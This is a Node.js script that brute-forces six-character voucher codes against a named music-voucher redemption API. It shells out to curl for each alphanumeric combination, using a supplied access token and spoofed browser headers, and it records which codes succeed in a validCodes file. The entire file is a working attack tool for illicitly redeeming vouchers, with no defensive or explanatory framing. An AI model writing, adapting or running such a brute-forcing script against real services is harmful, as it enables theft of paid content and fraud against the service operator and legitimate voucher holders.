const fs = require('fs');
const path = require('path');
const child_process = require('child_process');

const { start, accessToken, outDir } = require('./parse-arguments')(process.argv);

const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
const alphabetLength = alphabet.length;

const input = start.toUpperCase();

let firstIndex = alphabet.indexOf(input[0]);
let secondIndex = alphabet.indexOf(input[1]);
let thirdIndex = alphabet.indexOf(input[2]);
let fourthIndex = alphabet.indexOf(input[3]);
let fifthIndex = alphabet.indexOf(input[4]);
let sixthIndex = alphabet.indexOf(input[5]);


function runCmd(data) {
  const cmd = `curl 'http://api.fantom.tv/SW17/vouchers/redeem?albumKey=SW17&accessToken=${accessToken}&currentUrl=aHR0cDovL3d3dy5mYW50b20udHYvc3cxNw==' -H 'Origin: http://www.fantom.tv' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: es' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: http://www.fantom.tv/sw17' -H 'Connection: keep-alive' --data $'data%5BVoucher%5D%5Bcode%5D=${data}+alphabet+%3D+\'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\'' --compressed`;
  const resp = child_process.execSync(cmd);

  return resp.toString('UTF8');
}

for(let first = firstIndex; first < alphabetLength; first++) {
    firstIndex = 0;
    for(let second = secondIndex; second < alphabetLength; second++) {
        secondIndex = 0;
        for(let third = thirdIndex; third < alphabetLength; third++) {
            thirdIndex = 0;
            for(let fourth = fourthIndex; fourth < alphabetLength; fourth++) {
                fourthIndex = 0;
                for(let fifth = fifthIndex; fifth < alphabetLength; fifth++) {
                    fifthIndex = 0;
                    for(let sixth = sixthIndex; sixth < alphabetLength; sixth++) {
                        sixthIndex = 0;
                        const requestData = `${alphabet[first]}${alphabet[second]}${alphabet[third]}${alphabet[fourth]}${alphabet[fifth]}${alphabet[sixth]}`;
                        let result = null;
                        try {
                            result = JSON.parse(runCmd(requestData));
                            if(result.success) {
                                console.log(`✅ ${requestData}`);
                                fs.appendFileSync(`${outDir}validCodes.txt`, requestData + "\n");
                            } else {
                                console.log(`❎ ${requestData}`);
                                fs.appendFileSync(`${outDir}invalidCodes.txt`, requestData + "\n");
                            }

                            fs.writeFileSync(`${outDir}lastCode.txt`, requestData);
                        } catch(e) {
                            console.error(e);
                        }
                    }
                }
            }
        }
    }
}